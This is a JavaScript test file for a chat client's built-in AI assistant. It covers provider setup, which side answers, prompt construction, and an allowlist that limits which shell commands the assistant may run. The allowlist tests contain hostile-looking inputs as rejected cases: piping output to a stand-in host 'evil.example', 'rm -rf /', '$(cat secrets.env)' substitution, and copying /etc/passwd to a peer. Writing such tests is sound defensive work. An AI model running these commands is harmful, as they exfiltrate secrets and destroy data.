import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  AI_PROVIDERS, GOOGLE_MODELS, normaliseModelName, DEFAULT_AI_NAME, normaliseAiName, resolveAi, aiConfigPatch,
  mentionRegex, shouldAutoReply, shouldRunExplicitAi, aiOwnsAnswers, answersHere,
  createTurnBuffer, buildRequest,
  sanitiseReply, requestReply, AI_MAX_TOKENS, AI_FEEDBACK_EVERY, aiFrame,
  isReplyToAi, stripHumanMarker, splitCommands, commandIdentity,
  AI_SAFE_SHELL_COMMANDS, isSafeShellCommand, safeShellCommands,
  AI_QUIET_MS, AI_QUIET_WORDS, AI_RESUME_WORDS, isBareInstruction,
  isRetryableStatus, parseRetryAfter, retryPlan, abortableDelay, AI_RETRIES,
} from '../src/ai.js';

test('a bare setup falls back to the google preset and the default name', () => {
  const ai = resolveAi({ config: {}, env: {} });
  assert.equal(ai.provider, 'gemini');
  assert.equal(ai.url, AI_PROVIDERS.gemini.url);
  assert.equal(ai.model, 'gemini-3.5-flash-lite');
  assert.equal(ai.name, DEFAULT_AI_NAME);
  assert.equal(ai.key, null);
  assert.equal(ai.enabled, true, 'a key in the environment is consent enough');
});

test('with nothing configured, whichever key exists picks the provider', () => {
  // One variable is the whole setup, whichever of the three the person owns.
  assert.equal(resolveAi({ env: { OPENROUTER_API_KEY: 'o' } }).provider, 'openrouter');
  assert.equal(resolveAi({ env: { GEMINI_API_KEY: 'g' } }).provider, 'gemini');
  assert.equal(resolveAi({ env: { DEEPSEEK_API_KEY: 'd' } }).provider, 'deepseek');
  // Both present: the default preset still leads.
  assert.equal(resolveAi({ env: { GEMINI_API_KEY: 'g', OPENROUTER_API_KEY: 'o' } }).provider, 'gemini');
});

test('the deepseek preset is a named choice with its own variable', () => {
  // A paid key is the answer to a depleted free tier, so the preset has to be
  // reachable by name and not only by having its variable lying around.
  const ai = resolveAi({ config: { ai: { provider: 'deepseek' } }, env: { DEEPSEEK_API_KEY: 'd' } });
  assert.equal(ai.url, 'https://api.deepseek.com/chat/completions');
  assert.equal(ai.model, AI_PROVIDERS.deepseek.model);
  assert.equal(ai.keyEnv, 'DEEPSEEK_API_KEY');
  assert.equal(ai.key, 'd');
  // The choice is worth remembering; the preset's model is not.
  assert.deepEqual(aiConfigPatch(ai), { enabled: true, name: DEFAULT_AI_NAME, provider: 'deepseek' });
});

test('a named provider is obeyed even when its key is the missing one', () => {
  // Being told which variable to set beats being silently redirected.
  const ai = resolveAi({ config: { ai: { provider: 'gemini' } }, env: { OPENROUTER_API_KEY: 'o' } });
  assert.equal(ai.provider, 'gemini');
  assert.equal(ai.key, null);
  assert.equal(ai.keyEnv, 'GEMINI_API_KEY');
});

test('the key comes from the environment the chosen provider names', () => {
  assert.equal(resolveAi({ env: { GEMINI_API_KEY: 'g' } }).key, 'g');
  assert.equal(
    resolveAi({ config: { ai: { provider: 'openrouter' } }, env: { OPENROUTER_API_KEY: 'o' } }).key,
    'o',
  );
  // A custom endpoint has no preset variable, so there is one that always wins.
  assert.equal(
    resolveAi({ config: { ai: { url: 'http://x/v1' } }, env: { TAILCHAT_AI_KEY: 'k', GEMINI_API_KEY: 'g' } }).key,
    'k',
  );
});

test('a hand-mangled config falls back rather than breaking the client', () => {
  const ai = resolveAi({ config: { ai: { provider: 'nope', name: 'two words', model: '' } }, env: {} });
  assert.equal(ai.provider, 'gemini');
  assert.equal(ai.name, DEFAULT_AI_NAME);
  assert.equal(ai.model, AI_PROVIDERS.gemini.model);
  assert.equal(resolveAi({ config: { ai: 'yes' } }).provider, 'gemini');
});

test('a saved name and endpoint are honoured, and off stays off', () => {
  const ai = resolveAi({
    config: { ai: { name: '@Tailik', provider: 'openrouter', model: 'm', url: 'http://x', enabled: false } },
    env: { OPENROUTER_API_KEY: 'o' },
  });
  assert.equal(ai.name, 'Tailik');
  assert.equal(ai.url, 'http://x');
  assert.equal(ai.model, 'm');
  assert.equal(ai.enabled, false);
});

test('a name has to be one word that can be said in a sentence', () => {
  assert.equal(normaliseAiName('@tailik'), 'tailik');
  assert.equal(normaliseAiName('  tailik  '), 'tailik');
  assert.equal(normaliseAiName(''), null);
  assert.equal(normaliseAiName('   '), null);
  assert.equal(normaliseAiName('tail ik'), null);
  assert.equal(normaliseAiName('tailik:'), null, 'a colon would be read as attribution');
});

test('GOOGLE_MODELS contains active free Google Gemini models with default first', () => {
  assert.ok(Array.isArray(GOOGLE_MODELS));
  assert.ok(GOOGLE_MODELS.length >= 5);
  assert.ok(GOOGLE_MODELS.includes('gemini-3.7-flash-tiered'));
  assert.ok(GOOGLE_MODELS.includes('gemini-3.5-flash-lite'));
  assert.ok(GOOGLE_MODELS.includes('gemini-3.7-flash'));
  assert.ok(GOOGLE_MODELS.includes('gemini-3.6-flash'));
  assert.ok(GOOGLE_MODELS.includes('gemini-3.5-flash'));
  assert.ok(GOOGLE_MODELS.includes('gemini-3.1-pro'));
});
test('normaliseModelName resolves preset numbers, reset keywords, and explicit names', () => {
  assert.equal(normaliseModelName('1', 'gemini'), GOOGLE_MODELS[0]);
  assert.equal(normaliseModelName('2', 'gemini'), GOOGLE_MODELS[1]);
  assert.equal(normaliseModelName('default', 'gemini'), AI_PROVIDERS.gemini.model);
  assert.equal(normaliseModelName('reset', 'gemini'), AI_PROVIDERS.gemini.model);
  assert.equal(normaliseModelName('gemini-3.7-flash', 'gemini'), 'gemini-3.7-flash');
  assert.equal(normaliseModelName('  "gemini-2.5-flash"  ', 'gemini'), 'gemini-2.5-flash');
  assert.equal(normaliseModelName('99', 'gemini'), null, 'out of range number');
  assert.equal(normaliseModelName('0', 'gemini'), null, 'zero is invalid');
  assert.equal(normaliseModelName('', 'gemini'), null);
  assert.equal(normaliseModelName('two words', 'gemini'), null);
  assert.equal(normaliseModelName('invalid:name', 'gemini'), null);
});

test('what is written back to the config is the choice, not the preset', () => {
  const ai = resolveAi({ config: { ai: { provider: 'openrouter' } }, env: { OPENROUTER_API_KEY: 'secret' } });
  const patch = aiConfigPatch(ai);
  assert.equal(JSON.stringify(patch).includes('secret'), false, 'the key never lands in a file');
  // Only the deviation: a preset's own model must stay free to improve.
  assert.deepEqual(patch, { enabled: true, name: DEFAULT_AI_NAME, provider: 'openrouter' });
  assert.deepEqual(
    aiConfigPatch(resolveAi({ config: { ai: { model: 'gemini-2.5-pro', enabled: false } } })),
    { enabled: false, name: DEFAULT_AI_NAME, model: 'gemini-2.5-pro' },
  );
});

test('the AI name is recognised as a whole word in Latin and Cyrillic', () => {
  const addressed = (said) => mentionRegex('tailik').test(said);
  for (const said of ['tailik, help', '@tailik?', 'Тэйлик, привет', 'тэйлик', 'тайлик, ты тут', 'Тайлик, ответь']) {
    assert.equal(addressed(said), true);
  }
  for (const said of ['tailikov', 'detailik', 'Тэйликов', 'тайликов']) {
    assert.equal(addressed(said), false);
  }
});
test('never is a full off that survives resolution and patches cleanly', () => {
  const ai = resolveAi({ config: { ai: { never: true, enabled: true } }, env: {} });
  assert.equal(ai.never, true);
  assert.equal(ai.enabled, false, 'never dominates a stale enabled');
  // Only the explicit choice lands on disk; the default is never pinned.
  assert.deepEqual(
    aiConfigPatch({ name: 'x', enabled: false, never: true }),
    { enabled: false, name: 'x', never: true },
  );
  assert.deepEqual(
    aiConfigPatch({ name: 'x', enabled: true, never: false }),
    { enabled: true, name: 'x', never: false },
  );
  assert.deepEqual(
    aiConfigPatch({ name: 'x', enabled: true }),
    { enabled: true, name: 'x' },
  );
  assert.equal(resolveAi({ config: {}, env: {} }).never, undefined, 'absent means never-pinned');
});


test('small talk stays human and one client owns an addressed line', () => {
  const both = { enabled: true, hasKey: true };
  assert.equal(shouldAutoReply({
    ...both, fromSelf: true, peerHasAi: true, addressed: false,
  }), false, 'plain “how are you” does not summon AI');
  assert.equal(shouldAutoReply({
    ...both, fromSelf: true, peerHasAi: true, addressed: true,
  }), true);
  assert.equal(shouldAutoReply({
    ...both, fromSelf: false, peerHasAi: true, addressed: true,
  }), false, 'the author side already owns it');
  assert.equal(shouldAutoReply({
    ...both, fromSelf: false, peerHasAi: false, addressed: true,
  }), true, 'the single Mac AI is the fallback for Roman');
  assert.equal(shouldAutoReply({
    ...both, fromSelf: false, peerHasAi: false, addressed: false,
  }), false);
  assert.equal(shouldAutoReply({
    enabled: false, hasKey: true, fromSelf: true, peerHasAi: true, addressed: true,
  }), false);
});

// Two keys make "only one answers" depend on the caps frame having arrived and
// been understood, and `peerHasAi` starts false and is reset to false on every
// disconnect (src/cli.js) — so on a fresh connect, after a flap, or against a
// client that does not send the flag, both sides believe the other has no AI and
// both answer. That is the two-assistants-under-one-name confusion.
//
// One key removes the dependency instead of tuning it: the keyless side is
// silent for every possible value of peerHasAi, so no timing, no flap and no
// version skew can produce a second answer.
test('a side with no key cannot answer, whatever it believes about the peer', () => {
  for (const peerHasAi of [true, false, undefined, null]) {
    for (const fromSelf of [true, false]) {
      assert.equal(
        shouldAutoReply({
          enabled: true, hasKey: false, fromSelf, peerHasAi, addressed: true,
        }),
        false,
        `no key must stay silent (peerHasAi=${peerHasAi}, fromSelf=${fromSelf})`,
      );
    }
  }
  // And the same side with a key does answer a peer it believes has none —
  // which is exactly how the second assistant appeared.
  assert.equal(shouldAutoReply({
    enabled: true, hasKey: true, fromSelf: false, peerHasAi: false, addressed: true,
  }), true);
});

test('one key means one answer per question, from whichever side owns it', () => {
  const mine = { enabled: true, hasKey: true };
  const theirs = { enabled: true, hasKey: false };
  const advertises = (side) => side.enabled && side.hasKey;

  // I ask: my own AI owns my question, theirs stays out of it.
  assert.equal(shouldAutoReply({
    ...mine, fromSelf: true, peerHasAi: advertises(theirs), addressed: true,
  }), true);
  assert.equal(shouldAutoReply({
    ...theirs, fromSelf: false, peerHasAi: advertises(mine), addressed: true,
  }), false);

  // They ask: their client has no key, so mine answers for both of us.
  assert.equal(shouldAutoReply({
    ...theirs, fromSelf: true, peerHasAi: advertises(mine), addressed: true,
  }), false);
  assert.equal(shouldAutoReply({
    ...mine, fromSelf: false, peerHasAi: advertises(theirs), addressed: true,
  }), true);
});

// One-sided control of the whole conversation. `ai` on the wire means "answers
// here are mine", so a side that wants none claims it and the peer defers — and
// because the enforcement rides on a flag that has existed since 0.52.0, it
// works against a peer that has never heard of muting.
//
// What this replaces: /ai off silences this side only, and the answering moves
// to the other one, where it reappears under the same name. That reads exactly
// like a switch that does nothing.
test('a side that wants no AI can silence the whole conversation', () => {
  // The very function src/cli.js puts in the caps frame.
  const owns = aiOwnsAnswers;

  const quiet = resolveAi({ config: { ai: { never: true } }, env: { GEMINI_API_KEY: 'k' } });
  const willing = resolveAi({ config: {}, env: { GEMINI_API_KEY: 'k' } });

  assert.equal(owns(quiet), true, 'a muted side claims the answering');
  assert.equal(owns(willing), true);

  // Nobody answers an addressed line: not the muted side, not the willing one.
  assert.equal(shouldAutoReply({
    enabled: quiet.enabled, hasKey: Boolean(quiet.key),
    fromSelf: true, peerHasAi: owns(willing), addressed: true,
  }), false, 'the muted side stays out of it');
  assert.equal(shouldAutoReply({
    enabled: willing.enabled, hasKey: Boolean(willing.key),
    fromSelf: false, peerHasAi: owns(quiet), addressed: true,
  }), false, 'and the willing side defers to the claim instead of stepping in');

  // Their explicit /ai question and their fifteen-line recap go quiet too,
  // otherwise "nobody answers here" would still be answered twice a session.
  assert.equal(shouldRunExplicitAi({
    localAccepted: false, localEnabled: willing.enabled, peerHasAi: owns(quiet),
  }), false);

  // /ai off is deliberately different: it hands the answering over rather than
  // ending it, which is the "one AI on the Mac" arrangement.
  const off = resolveAi({ config: { ai: { enabled: false } }, env: { GEMINI_API_KEY: 'k' } });
  assert.equal(owns(off), false, 'switched off is not the same as claiming silence');
  assert.equal(shouldAutoReply({
    enabled: willing.enabled, hasKey: Boolean(willing.key),
    fromSelf: false, peerHasAi: owns(off), addressed: true,
  }), true, 'so the peer answers for both of them');
});

test('a muted side needs no key of its own to silence the conversation', () => {
  const owns = aiOwnsAnswers;
  const quiet = resolveAi({ config: { ai: { never: true } }, env: {} });
  assert.equal(quiet.key, null);
  assert.equal(owns(quiet), true, 'the claim is a decision, not a capability');
});

// The question three rounds of confusion were about: a switch was flipped, an
// assistant kept replying, and nothing said whose it was. /ai status answers it
// from this, so the rule is worth pinning down on its own.
test('who answers here is decided by both sides, decision before capability', () => {
  const withKey = { enabled: true, key: 'k' };

  assert.equal(answersHere({ ...withKey, peerOwns: false }), 'you');
  assert.equal(answersHere({ enabled: false, key: 'k', peerOwns: true }), 'peer');
  assert.equal(answersHere({ enabled: true, key: null, peerOwns: true }), 'peer');
  assert.equal(answersHere({ enabled: true, key: null, peerOwns: false }), 'none');

  // A decision to have none outranks a key on either side, and it is reported
  // against whoever made it — otherwise "nobody answers" would read as "they
  // answer" for as long as they still held a key.
  assert.equal(answersHere({ ...withKey, never: true, peerOwns: true }), 'nobody-mine');
  assert.equal(answersHere({ ...withKey, peerMuted: true, peerOwns: true }), 'nobody-peer');
  // Mine wins the wording when both muted: it is the one the reader can undo.
  assert.equal(
    answersHere({ ...withKey, never: true, peerMuted: true }), 'nobody-mine',
    'the side reading this is told about the switch it can flip',
  );
  assert.equal(answersHere(), 'none', 'nothing configured anywhere');
});

test('a direct continuation of the AI is addressed without repeating its name', () => {
  const aiTurn = { author: 'tailik', text: 'hello', ts: 1, kind: 'ai' };
  assert.equal(isReplyToAi([
    aiTurn, { author: 'roman', text: 'why?', ts: 2, kind: 'human' },
  ], 'tailik'), true);
  assert.equal(isReplyToAi([
    aiTurn,
    { author: 'roman', text: 'why?', ts: 2, kind: 'human' },
    { author: 'godsheep', text: 'later', ts: 3, kind: 'human' },
  ], 'tailik'), false);
});
test('an explicit /ai question follows the same single-owner route', () => {
  assert.equal(shouldRunExplicitAi({
    localAccepted: true, localEnabled: true, peerHasAi: true,
  }), false);
  // Roman is off: neither a stale key nor an offline Mac may start Windows AI.
  assert.equal(shouldRunExplicitAi({
    localAccepted: false, localEnabled: false, peerHasAi: true,
  }), false);
  assert.equal(shouldRunExplicitAi({
    localAccepted: false, localEnabled: false, peerHasAi: false,
  }), false);
  // An enabled local AI remains the explicit fallback when no peer owns it.
  assert.equal(shouldRunExplicitAi({
    localAccepted: false, localEnabled: true, peerHasAi: false,
  }), true);
  assert.equal(shouldRunExplicitAi({
    localAccepted: false, localEnabled: true, peerHasAi: undefined,
  }), true);
});
test('a leading @ plus space marks a line for the person and is stripped from the words', () => {
  assert.equal(stripHumanMarker('@ roman, how are you?'), 'roman, how are you?');
  assert.equal(stripHumanMarker('@  spaced'), 'spaced');
  // @tailik remains an AI address, and Markdown emphasis is ordinary text.
  assert.equal(stripHumanMarker('@tailik, help'), '@tailik, help');
  assert.equal(stripHumanMarker('**bold**'), '**bold**');
  assert.equal(stripHumanMarker('roman @ me'), 'roman @ me');
  assert.equal(stripHumanMarker('@'), '');
  assert.equal(stripHumanMarker(''), '');
  assert.equal(stripHumanMarker(undefined), '');
});

test('the answer reaches an old client as a message rather than not at all', () => {
  // A current peer reads a third author.
  assert.deepEqual(
    aiFrame({ name: 'tailik', text: 'try -vvv', ts: 7, peerSupportsAi: true }),
    { t: 'ai', name: 'tailik', text: 'try -vvv', ts: 7 },
  );
  assert.equal(aiFrame({ name: 'tailik', text: 'sync', ts: 7, id: 'history-1' }).id, 'history-1');
  // A peer that has not said yet is assumed current: unknown is not old.
  assert.equal(aiFrame({ name: 'tailik', text: 'x', ts: 7, peerSupportsAi: null }).t, 'ai');
  assert.equal(aiFrame({ name: 'tailik', text: 'x', ts: 7 }).t, 'ai');
  // One that predates the frame would drop it, so the answer becomes a message
  // and carries the author it was written under in the text.
  assert.deepEqual(
    aiFrame({ name: 'tailik', text: 'try -vvv', ts: 7, peerSupportsAi: false }),
    { t: 'msg', text: 'tailik: try -vvv', ts: 7 },
  );
  // No id: an old client cannot ack what has none, and nothing here waits for a
  // receipt against a message the sender never showed as its own.
  assert.equal(
    Object.hasOwn(aiFrame({ text: 'x', ts: 7, peerSupportsAi: false }), 'id'),
    false,
  );
});

test('the turn buffer keeps the last turns in order and drops empty ones', () => {
  const buffer = createTurnBuffer(3);
  for (const text of ['one', 'two', 'three', 'four']) buffer.push({ author: 'a', text, ts: 1 });
  assert.deepEqual(buffer.recent().map((turn) => turn.text), ['two', 'three', 'four']);
  buffer.push({ author: 'a', text: '   ' });
  assert.deepEqual(buffer.recent().map((turn) => turn.text), ['two', 'three', 'four'],
    'whitespace is not a turn');
});

test('the request tells the model who said what and which voice is its own', () => {
  const { system, messages } = buildRequest({
    turns: [
      { author: 'roman', text: 'ssh is refusing me', kind: 'human' },
      { author: 'lit', text: 'which host?', kind: 'human' },
      { author: 'tailik', text: 'try -vvv', kind: 'ai' },
      { author: 'lit', text: 'tailik, what next?', kind: 'human' },
    ],
    aiName: 'tailik',
    selfName: 'lit',
    peerName: 'roman',
  });
  assert.ok(system.includes('tailik'));
  assert.ok(system.includes('lit') && system.includes('roman'));
  assert.match(buildRequest({ version: '0.57.16' }).system, /v0\.57\.16/);
  assert.match(buildRequest({ version: '0.57.16' }).system, /never infer the version from git tags/);
  assert.match(system, /Never claim you are either person/);
  assert.match(system, /You cannot run terminal, remote, or web commands/);
  // Every human turn keeps its author; the AI's own turns are its own voice, so
  // they carry no prefix and would be nonsense attributed to anyone.
  assert.deepEqual(messages, [
    { role: 'user', content: 'roman: ssh is refusing me' },
    { role: 'user', content: 'lit: which host?' },
    { role: 'assistant', content: 'try -vvv' },
    { role: 'user', content: 'lit: tailik, what next?' },
  ]);
});

test('an empty conversation asks nothing of its own', () => {
  assert.deepEqual(buildRequest().messages, []);
});

test('recap mode waits for fifteen unanswered messages and runs no commands', () => {
  assert.equal(AI_FEEDBACK_EVERY, 15);
  const { system } = buildRequest({ mode: 'feedback' });
  assert.match(system, /recap/);
  assert.match(system, /Do not run commands/);
});
test('the assistant knows tailchat and carries the live command table', () => {
  const { system } = buildRequest({
    selfName: 'lit',
    peerName: 'roman',
    commands: ['/files (/f) — list the files of this session', '/ai — ask the assistant'],
  });
  // It knows where it lives and what it is.
  assert.ok(system.includes('tailchat'));
  assert.ok(system.includes('lit') && system.includes('roman'));
  // The commands it is handed appear verbatim; nothing else invents a list.
  assert.ok(system.includes('/files (/f) — list the files of this session'));
  const bare = buildRequest().system;
  assert.ok(bare.includes('tailchat'));
  assert.ok(!bare.includes('Tailchat commands you may be asked about'));
});
test('the assistant is told which of its own commands it may run, only when told', () => {
  const system = buildRequest({ appCommands: ['/theme', '/clear'] }).system;
  assert.match(system, /cannot run terminal, remote, or web commands/);
  assert.ok(system.includes('/theme, /clear'));
  assert.match(system, /own commands yourself/);
  const bare = buildRequest().system;
  assert.match(bare, /cannot run terminal, remote, or web commands/);
  assert.ok(!bare.includes('own commands yourself'), 'no list, no invitation to run one');
});
test('the assistant is told exactly which shell commands it may run, only when told', () => {
  const system = buildRequest({ shellCommands: ['git log', 'whoami'] }).system;
  assert.match(system, /git log, whoami/);
  assert.ok(!system.includes('cannot run terminal, remote, or web commands'));
  const bare = buildRequest().system;
  assert.match(bare, /cannot run terminal, remote, or web commands/);
  assert.ok(!bare.includes('check this machine yourself'));
});
test('the turn buffer keeps a tool turn a tool, and the request names its output', () => {
  const buffer = createTurnBuffer(10);
  buffer.push({ author: 'tool', text: '/changelog:\n0.57.16: /settings back', kind: 'tool' });
  assert.equal(buffer.recent()[0].kind, 'tool');
  const { system, messages } = buildRequest({ turns: buffer.recent(), appCommands: ['/changelog'] });
  assert.ok(system.includes('[command output]'));
  assert.deepEqual(messages[0], {
    role: 'user', content: '[command output]\n/changelog:\n0.57.16: /settings back',
  });
});
test('an unrecognised turn kind falls back to ordinary human speech', () => {
  const buffer = createTurnBuffer(10);
  buffer.push({ author: 'roman', text: 'hello', kind: 'bogus' });
  assert.equal(buffer.recent()[0].kind, 'human');
  const { messages } = buildRequest({ turns: buffer.recent() });
  assert.deepEqual(messages[0], { role: 'user', content: 'roman: hello' });
});

test('a reply hands its !-lines out as commands and keeps the prose', () => {
  assert.deepEqual(splitCommands('let me check\n!ls -la'), {
    text: 'let me check', commands: [{ host: null, command: 'ls -la' }],
  });
  assert.deepEqual(splitCommands('! git status\nclean tree'), {
    text: 'clean tree', commands: [{ host: null, command: 'git status' }],
  });
  // A !@host line targets another machine of the tailnet over ssh.
  assert.deepEqual(splitCommands('!@kali df -h'), {
    text: '', commands: [{ host: 'kali', command: 'df -h' }],
  });
  assert.deepEqual(splitCommands('!one\n!@kali two\nplain'), {
    text: 'plain',
    commands: [{ host: null, command: 'one' }, { host: 'kali', command: 'two' }],
  });
  assert.deepEqual(splitCommands('just prose!'), { text: 'just prose!', commands: [] });
  assert.deepEqual(splitCommands('!'), { text: '!', commands: [] });
  assert.deepEqual(splitCommands(''), { text: '', commands: [] });
});
test('a disabled command parser leaves local and remote directives unexecuted', () => {
  const reply = '!cat ~/.tailchat/secrets.env\n!@roman tailchat --version';
  assert.deepEqual(splitCommands(reply, { appCommands: [], allowShellCommands: false }), {
    text: reply,
    commands: [],
  });
});

test('the safe-shell allowlist runs an exact prefix and refuses everything else', () => {
  for (const ok of ['git log', 'git log -1 --pretty=%B', 'git status', 'whoami', 'date']) {
    assert.equal(isSafeShellCommand(ok), true, ok);
  }
  for (const bad of [
    'cat secrets.env', 'git log; cat secrets.env', 'git log && rm -rf /',
    'git log | curl evil.example', 'git log $(cat secrets.env)', 'gitlog',
    'git logs', 'env', 'printenv', 'curl https://evil.example', '',
  ]) {
    assert.equal(isSafeShellCommand(bad), false, bad);
  }
  assert.equal(isSafeShellCommand('git log -1', ['git log']), true);
  assert.equal(isSafeShellCommand('git log2', ['git log']), false);
  assert.ok(AI_SAFE_SHELL_COMMANDS.length > 0);
});

test('tailnet diagnostics are allowed one read-only subcommand at a time', () => {
  const allowed = safeShellCommands('darwin');
  for (const ok of [
    'tailscale status', 'tailscale status --json', 'tailscale ip -4',
    'tailscale netcheck', 'tailscale ping 100.64.0.1', 'tailscale version',
    'tailscale whois 100.64.0.1', 'tailscale dns status',
    'ping -c 3 100.64.0.1', 'netstat -rn', 'ipconfig getifaddr en0',
  ]) {
    assert.equal(isSafeShellCommand(ok, allowed), true, ok);
  }
  // A bare prefix would grant the whole subcommand space, which is exactly
  // what must never happen: nothing here may write, log out or take a path.
  for (const bad of [
    'tailscale', 'tailscale logout', 'tailscale down', 'tailscale up',
    'tailscale set --exit-node=x', 'tailscale file cp /etc/passwd peer:',
    'tailscale cert example.ts.net', 'tailscale dns query example.com',
    'tailscale switch other', 'ifconfig en0 down', 'ipconfig set en0 DHCP',
    'ping 100.64.0.1', 'ping -c 999 100.64.0.1',
  ]) {
    assert.equal(isSafeShellCommand(bad, allowed), false, bad);
  }
  // The ping flag is the one platform-dependent entry: -c counts packets
  // everywhere except Windows, where it is -n, and an uncounted ping never ends.
  assert.equal(isSafeShellCommand('ping -n 3 100.64.0.1', safeShellCommands('win32')), true);
  assert.equal(isSafeShellCommand('ping -c 3 100.64.0.1', safeShellCommands('win32')), false);
  assert.equal(isSafeShellCommand('ip addr show', safeShellCommands('linux')), true);
  assert.equal(isSafeShellCommand('ip addr add 10.0.0.1/8 dev eth0', safeShellCommands('linux')), false);
  // An unknown platform gets the generic posix set rather than nothing at all.
  assert.deepEqual(safeShellCommands('freebsd'), safeShellCommands('linux'));
});

test('a reply that is only a tailchat command is handed back as an app command', () => {
  assert.deepEqual(splitCommands('/theme ocean'), {
    text: '', commands: [{ app: '/theme', arg: 'ocean' }],
  });
  assert.deepEqual(splitCommands('sure, one sec\n/clear'), {
    text: 'sure, one sec', commands: [{ app: '/clear', arg: '' }],
  });
  assert.deepEqual(splitCommands('/Clear'), { text: '', commands: [{ app: '/clear', arg: '' }] });
  // A path is never mistaken for a command: it has more than one slash's
  // worth of content, or starts with a digit, and either way is prose.
  assert.deepEqual(
    splitCommands('see /usr/local/bin/tailchat'),
    { text: 'see /usr/local/bin/tailchat', commands: [] },
  );
  assert.deepEqual(splitCommands('/2026-08-26'), { text: '/2026-08-26', commands: [] });
  // The two kinds mix freely in one reply.
  assert.deepEqual(splitCommands('!ls -la\n/theme amber\nall set'), {
    text: 'all set',
    commands: [{ host: null, command: 'ls -la' }, { app: '/theme', arg: 'amber' }],
  });
});
test('a repeated AI command is parsed once, even when command types mix', () => {
  assert.deepEqual(splitCommands('!/bin/true\n!/bin/true\n/saver\n/saver'), {
    text: '',
    commands: [{ host: null, command: '/bin/true' }, { app: '/saver', arg: '' }],
  });
  assert.notEqual(
    commandIdentity({ host: null, command: 'uptime' }),
    commandIdentity({ host: 'laptop', command: 'uptime' }),
    'the target machine is part of a shell command identity',
  );
});

test('the model listing its own commands is prose, not a queue of invocations', () => {
  // Asked "какие команды ты умеешь?", the model answers by listing them —
  // `/theme — сменить тему`, one per line. Every such line matched the app
  // regex, so the whole answer was stripped down to nothing and `/theme` ran
  // with the garbage argument `— сменить тему`. A dash or colon right after
  // the word is what a description looks like; a real argument never starts
  // with one.
  const reply = [
    'Вот что я умею:',
    '/theme — сменить тему',
    '/help: список команд',
    '/clear - очистить переписку',
    'Пиши, если нужно.',
  ].join('\n');
  assert.deepEqual(splitCommands(reply), { text: reply, commands: [] });
  // Still a real command once it looks like one.
  assert.deepEqual(splitCommands('/theme ocean'), {
    text: '', commands: [{ app: '/theme', arg: 'ocean' }],
  });
});

test('an allowlist keeps an unrecognised /word out of the queue too', () => {
  const allowed = ['/theme', '/clear'];
  assert.deepEqual(splitCommands('/quit', { appCommands: allowed }), {
    text: '/quit', commands: [],
  });
  assert.deepEqual(splitCommands('/theme ocean', { appCommands: allowed }), {
    text: '', commands: [{ app: '/theme', arg: 'ocean' }],
  });
  // No list at all — the default — recognises every well-formed name, which
  // is what every test above this one relies on.
  assert.deepEqual(splitCommands('/quit'), { text: '', commands: [{ app: '/quit', arg: '' }] });
});
test('an empty app-command allowlist leaves slash commands as Tailik prose', () => {
  assert.deepEqual(splitCommands('/happy', { appCommands: [] }), {
    text: '/happy',
    commands: [],
  });
});

test('/stop aborts the in-flight call with its own reason', async () => {
  const controller = new AbortController();
  const pending = requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'deepseek-v4-flash', name: 'tailik' },
    system: '',
    messages: [],
    signal: controller.signal,
    fetchImpl: (_url, opts) => new Promise((_resolve, reject) => {
      opts.signal.addEventListener('abort', () => {
        reject(Object.assign(new Error('aborted'), { name: 'AbortError' }));
      });
    }),
  });
  controller.abort();
  assert.deepEqual(await pending, { ok: false, reason: 'stopped' });
});

test('a reply never carries participant or tool transcript framing', () => {
  const speakers = { aiName: 'tailik', humanNames: ['godsheep', 'Roman'] };
  assert.equal(sanitiseReply('tailik: hello', speakers), 'hello');
  assert.equal(sanitiseReply('Tailik : hello', speakers), 'hello');
  assert.equal(sanitiseReply('godsheep: hello', speakers), 'hello');
  assert.equal(sanitiseReply('Roman: hi\ntailik: hello', speakers), 'hi\nhello');
  assert.equal(sanitiseReply('(!git describe --tags)\nready', speakers), 'ready');
  assert.equal(sanitiseReply('Answer:\n[command output]\n(exit 0)\nv0.52.0\n\nSummary', speakers), 'Answer:\nSummary');
  assert.equal(sanitiseReply('  spaced  '), 'spaced');
  assert.equal(sanitiseReply('a\n\n\n\nb'), 'a\n\nb');
  assert.equal(sanitiseReply(null), '');
});

test('a reply too long for a terminal is cut on a word', () => {
  const out = sanitiseReply(`${'word '.repeat(100)}end`, { maxChars: 40 });
  assert.ok(out.length <= 41, `got ${out.length}`);
  assert.ok(out.endsWith('…'));
  assert.equal(out.includes('wor…'), false, 'a word is not cut in half');
});

test('the call asks the configured endpoint in the openai dialect', async () => {
  const seen = [];
  const result = await requestReply({
    resolved: { url: 'http://x/v1/chat/completions', key: 'k', model: 'm', name: 'tailik' },
    system: 'you are tailik',
    messages: [{ role: 'user', content: 'lit: hi' }],
    fetchImpl: async (url, init) => {
      seen.push({ url, init });
      return { ok: true, json: async () => ({ choices: [{ message: { content: 'tailik: hey' } }] }) };
    },
  });
  assert.deepEqual(result, { ok: true, text: 'hey' });
  assert.equal(seen[0].url, 'http://x/v1/chat/completions');
  assert.equal(seen[0].init.headers.authorization, 'Bearer k');
  const body = JSON.parse(seen[0].init.body);
  assert.equal(body.model, 'm');
  assert.deepEqual(body.messages, [
    { role: 'system', content: 'you are tailik' },
    { role: 'user', content: 'lit: hi' },
  ]);
});

test('every way a call can fail comes back as a reason, never as a throw', async () => {
  const resolved = { url: 'http://x', key: 'k', model: 'm', name: 'tailik' };

  assert.deepEqual(
    await requestReply({ resolved: { ...resolved, key: null } }),
    { ok: false, reason: 'no-key' },
  );

  // The retry is skipped over with an instant wait: this case is about the
  // reason a dead network comes back with, not about how long it takes.
  assert.deepEqual(
    await requestReply({
      resolved, system: '', messages: [], delayImpl: async () => {},
      fetchImpl: async () => { throw new Error('ECONNREFUSED'); },
    }),
    { ok: false, reason: 'network' },
  );

  const timedOut = Object.assign(new Error('timeout'), { name: 'TimeoutError' });
  assert.deepEqual(
    await requestReply({ resolved, system: '', messages: [], fetchImpl: async () => { throw timedOut; } }),
    { ok: false, reason: 'timeout' },
  );

  // The provider's own words matter: a depleted key and an unknown model are
  // both 4xx and want different actions from the person reading the line.
  assert.deepEqual(
    await requestReply({
      resolved,
      system: '',
      messages: [],
      delayImpl: async () => {},
      fetchImpl: async () => ({
        ok: false,
        status: 429,
        json: async () => ({ error: { message: 'Your prepayment credits are depleted.' } }),
      }),
    }),
    { ok: false, reason: 'http 429', detail: 'Your prepayment credits are depleted.' },
  );

  // A model that answers with nothing but its own reasoning is a failure, not a
  // blank line in the transcript.
  assert.deepEqual(
    await requestReply({
      resolved,
      system: '',
      messages: [],
      fetchImpl: async () => ({ ok: true, json: async () => ({ choices: [{ message: { content: '  ' } }] }) }),
    }),
